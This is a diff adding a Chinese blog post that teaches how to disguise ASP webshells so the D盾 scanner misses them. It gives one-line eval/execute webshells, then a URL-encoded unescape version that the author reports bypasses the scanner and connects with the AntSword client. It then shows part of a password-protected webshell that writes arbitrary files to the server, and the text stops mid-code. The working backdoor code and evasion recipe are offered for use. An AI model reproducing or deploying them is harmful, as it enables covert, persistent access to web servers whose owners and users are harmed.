@@ -1,0 +1,763 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>[知识星球]WebShell免杀之ASP - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="[知识星球]WebShell免杀之ASP" />
+<meta property="og:description" content="1 前言授人以鱼不如授人以渔 所以准备给星球写一份免杀的系列文章 让大家自己掌握免杀的一些技巧跟方法，这样即使脚本失效也不用每次都催着我更新了 正好" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/webshell-bypass-asp/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-10-02T13:41:43+00:00" />
+<meta property="article:modified_time" content="2019-10-02T13:41:43+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="[知识星球]WebShell免杀之ASP"/>
+<meta name="twitter:description" content="1 前言授人以鱼不如授人以渔 所以准备给星球写一份免杀的系列文章 让大家自己掌握免杀的一些技巧跟方法，这样即使脚本失效也不用每次都催着我更新了 正好"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/webshell-bypass-asp/" /><link rel="prev" href="https://yzddmr6.com/posts/hack-pubg-cheat-site-1/" /><link rel="next" href="https://yzddmr6.com/posts/xm-one-year-awd/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "[知识星球]WebShell免杀之ASP",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/webshell-bypass-asp\/"
+        },"genre": "posts","keywords": "webshell, 免杀","wordcount":  1863 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/webshell-bypass-asp\/","datePublished": "2019-10-02T13:41:43+00:00","dateModified": "2019-10-02T13:41:43+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#正文">正文</a>
+      <ul>
+        <li><a href="#第一步确定免杀目标">第一步，确定免杀目标</a></li>
+        <li><a href="#第二步打开语法手册">第二步，打开语法手册</a></li>
+        <li><a href="#第三步混淆">第三步，混淆</a></li>
+      </ul>
+    </li>
+    <li><a href="#反思拓展">反思拓展</a>
+      <ul>
+        <li><a href="#eval与execute">eval与execute</a>
+          <ul>
+            <li><a href="#eval-计算一个表达式的值并返回结果">Eval 计算一个表达式的值并返回结果</a></li>
+            <li><a href="#execute-执行一个或多个指定的语句多个语句间用冒号隔开">Execute 执行一个或多个指定的语句。多个语句间用冒号（:）隔开</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#具体实现">具体实现</a>
+      <ul>
+        <li><a href="#代码处理">代码处理</a></li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[知识星球]WebShell免杀之ASP</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"><i class="far fa-folder fa-fw"></i>技术文章</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-10-02">2019-10-02</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2019-10-02">2019-10-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1863 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#正文">正文</a>
+      <ul>
+        <li><a href="#第一步确定免杀目标">第一步，确定免杀目标</a></li>
+        <li><a href="#第二步打开语法手册">第二步，打开语法手册</a></li>
+        <li><a href="#第三步混淆">第三步，混淆</a></li>
+      </ul>
+    </li>
+    <li><a href="#反思拓展">反思拓展</a>
+      <ul>
+        <li><a href="#eval与execute">eval与execute</a>
+          <ul>
+            <li><a href="#eval-计算一个表达式的值并返回结果">Eval 计算一个表达式的值并返回结果</a></li>
+            <li><a href="#execute-执行一个或多个指定的语句多个语句间用冒号隔开">Execute 执行一个或多个指定的语句。多个语句间用冒号（:）隔开</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#具体实现">具体实现</a>
+      <ul>
+        <li><a href="#代码处理">代码处理</a></li>
+      </ul>
+    </li>
+    <li><a href="#最后">最后</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>授人以鱼不如授人以渔</p>
+<p>所以准备给星球写一份免杀的系列文章</p>
+<p>让大家自己掌握免杀的一些技巧跟方法，这样即使脚本失效也不用每次都催着我更新了</p>
+<p>正好前一段时间有成员问我asp免杀的问题，那就先拿asp开刀吧。</p>
+<h2 id="正文" class="headerLink">
+    <a href="#%e6%ad%a3%e6%96%87" class="header-mark"></a>2 正文</h2><h3 id="第一步确定免杀目标" class="headerLink">
+    <a href="#%e7%ac%ac%e4%b8%80%e6%ad%a5%e7%a1%ae%e5%ae%9a%e5%85%8d%e6%9d%80%e7%9b%ae%e6%a0%87" class="header-mark"></a>2.1 第一步，确定免杀目标</h3><p>比如普通的asp一句话就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;% eval(request(&#34;mr6&#34;))%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>或者</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;% execute request(&#34;mr6&#34;) %&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也就是说你的shell在一系列操作之后要达到这种效果</p>
+<p>因为eval execute在asp中类似一种语言结构，除了大小写之外不能对其进行变化</p>
+<p>所以我们混淆的重点主要是后面的<code>request(&quot;mr6&quot;)</code>参数</p>
+<h3 id="第二步打开语法手册" class="headerLink">
+    <a href="#%e7%ac%ac%e4%ba%8c%e6%ad%a5%e6%89%93%e5%bc%80%e8%af%ad%e6%b3%95%e6%89%8b%e5%86%8c" class="header-mark"></a>2.2 第二步，打开语法手册</h3><p>百度搜一个asp语法手册</p>
+<p><a href="https://www.w3school.com.cn/vbscript/vbscript_ref_functions.asp" target="_blank" rel="noopener noreferrer">https://www.w3school.com.cn/vbscript/vbscript_ref_functions.asp</a></p>
+<p>查找到字符串有关的函数，随便选一个</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426242-c5439bf5-fa16-4930-81b2-8a0b198ded3a.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426242-c5439bf5-fa16-4930-81b2-8a0b198ded3a.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426242-c5439bf5-fa16-4930-81b2-8a0b198ded3a.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426242-c5439bf5-fa16-4930-81b2-8a0b198ded3a.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426242-c5439bf5-fa16-4930-81b2-8a0b198ded3a.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426242-c5439bf5-fa16-4930-81b2-8a0b198ded3a.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>他这里只是显示了一部分，我就拿<code>unescape</code>来举例子</p>
+<h3 id="第三步混淆" class="headerLink">
+    <a href="#%e7%ac%ac%e4%b8%89%e6%ad%a5%e6%b7%b7%e6%b7%86" class="header-mark"></a>2.3 第三步，混淆</h3><p>unescape在asp中相当于php的urldecode，就是url编码</p>
+<p>所以先把payload给编码一遍</p>
+<p>为了增强混淆的效果，所以采用burp的decoder模块，因为burp是对所有字符进行编码。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426354-ba518017-dd6a-4b29-9184-09e52b88db88.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426354-ba518017-dd6a-4b29-9184-09e52b88db88.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426354-ba518017-dd6a-4b29-9184-09e52b88db88.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426354-ba518017-dd6a-4b29-9184-09e52b88db88.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426354-ba518017-dd6a-4b29-9184-09e52b88db88.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426354-ba518017-dd6a-4b29-9184-09e52b88db88.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>扫一下，发现四级</p>
+<p>提示eval参数xxxx</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426447-5ab2d424-cdbc-4d52-bebc-9dbd65762e6e.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426447-5ab2d424-cdbc-4d52-bebc-9dbd65762e6e.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426447-5ab2d424-cdbc-4d52-bebc-9dbd65762e6e.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426447-5ab2d424-cdbc-4d52-bebc-9dbd65762e6e.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426447-5ab2d424-cdbc-4d52-bebc-9dbd65762e6e.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426447-5ab2d424-cdbc-4d52-bebc-9dbd65762e6e.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>那么我们定义个函数传进去呢</p>
+<p>发现已经降到了一级</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426618-ffe2f982-67f9-435f-8d92-12cfca68d245.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426618-ffe2f982-67f9-435f-8d92-12cfca68d245.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426618-ffe2f982-67f9-435f-8d92-12cfca68d245.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426618-ffe2f982-67f9-435f-8d92-12cfca68d245.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426618-ffe2f982-67f9-435f-8d92-12cfca68d245.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426618-ffe2f982-67f9-435f-8d92-12cfca68d245.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>但是我们的目标是做到0级</p>
+<p>继续分析一下查杀的原因是<code>参数test(xxxx)</code></p>
+<p>随便改一下参数内容试一下</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426738-9f184ef1-554f-49e2-becf-19f413e98a61.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426738-9f184ef1-554f-49e2-becf-19f413e98a61.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426738-9f184ef1-554f-49e2-becf-19f413e98a61.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426738-9f184ef1-554f-49e2-becf-19f413e98a61.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426738-9f184ef1-554f-49e2-becf-19f413e98a61.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426738-9f184ef1-554f-49e2-becf-19f413e98a61.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>当我们传入123456时还是报一级，说明这时D盾查杀的只是调用，而跟你传什么东西没有关系</p>
+<p>把参数删掉试试</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426851-66334884-40d3-4712-accc-771fa27101ea.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426851-66334884-40d3-4712-accc-771fa27101ea.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426851-66334884-40d3-4712-accc-771fa27101ea.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426851-66334884-40d3-4712-accc-771fa27101ea.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426851-66334884-40d3-4712-accc-771fa27101ea.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900426851-66334884-40d3-4712-accc-771fa27101ea.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>此时D盾就不再提示了</p>
+<p>所以我们只需要构造一个无参数函数即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">Function test():
+</span></span><span class="line"><span class="cl">    dim aaa
+</span></span><span class="line"><span class="cl">    aaa=&#34;%65%76%61%6c%28%72%65%71%75%65%73%74%28%22%6d%72%36%22%29%29&#34;
+</span></span><span class="line"><span class="cl">	test = unescape(aaa)
+</span></span><span class="line"><span class="cl">End Function
+</span></span><span class="line"><span class="cl">eval(test())
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>成功bypass D盾</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427004-4b327513-1e77-4bc5-bdc7-eb508f3b1074.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427004-4b327513-1e77-4bc5-bdc7-eb508f3b1074.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427004-4b327513-1e77-4bc5-bdc7-eb508f3b1074.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427004-4b327513-1e77-4bc5-bdc7-eb508f3b1074.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427004-4b327513-1e77-4bc5-bdc7-eb508f3b1074.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427004-4b327513-1e77-4bc5-bdc7-eb508f3b1074.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>使用蚁剑成功连接</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427136-36fcb5af-d673-4879-bfe2-1a5c6f2f7e8d.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427136-36fcb5af-d673-4879-bfe2-1a5c6f2f7e8d.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427136-36fcb5af-d673-4879-bfe2-1a5c6f2f7e8d.png"
+            srcset="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427136-36fcb5af-d673-4879-bfe2-1a5c6f2f7e8d.png, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427136-36fcb5af-d673-4879-bfe2-1a5c6f2f7e8d.png 1.5x, https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900427136-36fcb5af-d673-4879-bfe2-1a5c6f2f7e8d.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>原理都是一样的，一个函数被杀了就换一个函数</p>
+<h2 id="反思拓展" class="headerLink">
+    <a href="#%e5%8f%8d%e6%80%9d%e6%8b%93%e5%b1%95" class="header-mark"></a>3 反思拓展</h2><p>既然我们可以把任意的payload编码一下然后eval，那么我们是否可以用同样的办法实现对任意文件免杀？</p>
+<p>答案当然是可以的</p>
+<p>但是我们前提是要说明一点区别</p>
+<h3 id="eval与execute" class="headerLink">
+    <a href="#eval%e4%b8%8eexecute" class="header-mark"></a>3.1 eval与execute</h3><h4 id="eval-计算一个表达式的值并返回结果" class="headerLink">
+    <a href="#eval-%e8%ae%a1%e7%ae%97%e4%b8%80%e4%b8%aa%e8%a1%a8%e8%be%be%e5%bc%8f%e7%9a%84%e5%80%bc%e5%b9%b6%e8%bf%94%e5%9b%9e%e7%bb%93%e6%9e%9c" class="header-mark"></a>3.1.1 Eval 计算一个表达式的值并返回结果</h4><p>语法：[result = ]Eval(expression)</p>
+<p>expression 为任意有效 VBScript 表达式的字符串</p>
+<p>示例：response.Write(eval(&ldquo;3+2&rdquo;)) &lsquo;输出 5</p>
+<p>&ldquo;3+2&rdquo; 使用引号括起来，表示是一个字符串，但是在 Eval “眼里”，把它当作一个表达式 3+2 来执行。</p>
+<h4 id="execute-执行一个或多个指定的语句多个语句间用冒号隔开" class="headerLink">
+    <a href="#execute-%e6%89%a7%e8%a1%8c%e4%b8%80%e4%b8%aa%e6%88%96%e5%a4%9a%e4%b8%aa%e6%8c%87%e5%ae%9a%e7%9a%84%e8%af%ad%e5%8f%a5%e5%a4%9a%e4%b8%aa%e8%af%ad%e5%8f%a5%e9%97%b4%e7%94%a8%e5%86%92%e5%8f%b7%e9%9a%94%e5%bc%80" class="header-mark"></a>3.1.2 Execute 执行一个或多个指定的语句。多个语句间用冒号（:）隔开</h4><p>语法：Execute statements</p>
+<p>示例：Execute &ldquo;response.Write(&ldquo;&ldquo;abc&rdquo;&rdquo;)&rdquo; &lsquo;输出 abc</p>
+<p>&ldquo;response.Write(&ldquo;&ldquo;abc&rdquo;&rdquo;)&rdquo; 使用引号括起来，表示是一个字符串，但是在 Execute “眼里”，把它当作一个语句 response.Write(&ldquo;abc&rdquo;) 来执行。</p>
+<p>也就是说对于小马来说只有一句话，所以两者用哪个都可以</p>
+<p>但是大马是多句，就不能用eval来执行了，而要用execute</p>
+<h2 id="具体实现" class="headerLink">
+    <a href="#%e5%85%b7%e4%bd%93%e5%ae%9e%e7%8e%b0" class="header-mark"></a>4 具体实现</h2><p>首先随便找个大马</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">on error resume next
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">  if request(&#34;pass&#34;)=&#34;g&#34; then  &#39;在这修改密码
+</span></span><span class="line"><span class="cl">  session(&#34;pw&#34;)=&#34;go&#34;
+</span></span><span class="line"><span class="cl">  end if
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span><span class="line"><span class="cl">&lt;%if session(&#34;pw&#34;)&lt;&gt;&#34;go&#34; then %&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;center&gt;&lt;br&gt;&lt;form action=&#39;&#39; method=&#39;post&#39;&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;&lt;input name=&#39;pass&#39; type=&#39;password&#39; size=&#39;10&#39;&gt; &lt;input &#34;%&gt;&lt;%=&#34;type=&#39;submit&#39; value=&#39;test&#39;&gt;&lt;/center&gt;&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%else%&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">set fso=server.createobject(&#34;scripting.filesystemobject&#34;)
+</span></span><span class="line"><span class="cl">path=request(&#34;path&#34;)
+</span></span><span class="line"><span class="cl">if path&lt;&gt;&#34;&#34; then
+</span></span><span class="line"><span class="cl">data=request(&#34;da&#34;)
+</span></span><span class="line"><span class="cl">set da=fso.createtextfile(path,true)
+</span></span><span class="line"><span class="cl">da.write data
+</span></span><span class="line"><span class="cl">if err=0 then
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;yes&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%else%&gt;
+</span></span><span class="line"><span class="cl">&lt;%=&#34;no&#34;%&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">end if
